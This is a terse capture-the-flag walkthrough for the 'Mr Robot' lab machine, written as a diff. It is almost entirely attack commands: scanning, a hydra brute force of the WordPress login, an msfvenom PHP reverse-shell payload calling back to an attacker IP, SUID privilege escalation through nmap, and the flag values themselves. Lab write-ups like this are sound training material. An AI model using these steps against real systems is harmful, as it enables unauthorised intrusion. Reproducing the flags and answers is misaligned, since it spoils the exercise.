@@ -1,0 +1,95 @@
+Mr Robot CTF
+
+ping 10.10.133.193
+OR
+nmap -sn 10.10.133.193
+
+nmap -Pn -p- 10.10.133.193
+
+nmap -Pn -p80,443 -sV -sC 10.10.133.193
+
+nikto -h 10.10.133.193
+
+10.10.133.193/robots.txt
+
+10.10.133.193/fsocity.dic
+
+http://10.10.133.193/key-1-of-3.txt
+
+073403c8a58a1f80d943455fb30724b9
+
+feroxbuster -u http://10.10.133.193/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+http://10.10.133.193/wp-login.php
+
+wpscan --url 10.10.133.193 --enumerate u
+
+NOT FOUND
+
+hydra -L fsocity.dic -p test 10.10.133.193 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username.'
+
+Username: Elliot
+
+cat fsocity.dic | sort | uniq >> passwd
+
+wpscan --url 10.10.133.193 -P passwd -U Elliot
+
+Passwd: ER28-0652
+
+GOTO Plugins -> Add New -> upload php payload.
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.9.12 lport=4444 -f raw > shell.php
+
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST your-ip 
+set LPORT listening-port run
+
+http://10.10.68.66/wp-admin/upload.php?mode=list
+
+http://10.10.68.66/wp-content/uploads/2022/11/shell.php 
+
+BOOM!!!!!!!!!!!
+
+Post-Exploitation
+
+search -f key-2-of-3.txt
+
+NO permission to read or write
+
+cat password.raw-md5
+
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+https://crackstation.net/
+
+MD5 
+hash = c3fcd3d76192e4007dfb496cca67e13b
+crack = abcdefghijklmnopqrstuvwxyz
+
+su robot
+
+https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+su robot
+passs: abcdefghijklmnopqrstuvwxyz
+
+export TERM=xterm
+
+cat key-2-of-3.txt
+
+822c73956184f694993bede3eb39f959
+
+find / -perm /4000
+
+https://gtfobins.github.io/
+
+nmap --interactive
+nmap> !sh
+
+cd root
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
